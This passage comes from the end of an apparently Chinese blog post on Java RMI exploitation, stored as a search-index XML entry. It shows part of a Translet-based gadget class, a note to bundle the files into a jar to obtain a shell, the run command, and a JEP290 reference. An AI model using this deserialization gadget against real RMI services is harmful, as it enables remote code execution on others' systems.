handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    private Object toCString(String s) &#123;</span><br><span class="line">        if (s == null)</span><br><span class="line">            return null;</span><br><span class="line">        byte[] bytes  = s.getBytes();</span><br><span class="line">        byte[] result = new byte[bytes.length + 1];</span><br><span class="line">        System.arraycopy(bytes, 0,</span><br><span class="line">                result, 0,</span><br><span class="line">                bytes.length);</span><br><span class="line">        result[result.length - 1] = (byte) 0;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个文件放一起打成jar包，把所有依赖都打上，拿到shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp nocc.jar demo.listener</span><br></pre></td></tr></table></figure><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a href="https://drun1baby.top/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/#%E6%B5%85%E8%B0%88-JEP290">https://drun1baby.top/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/#%E6%B5%85%E8%B0%88-JEP290</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
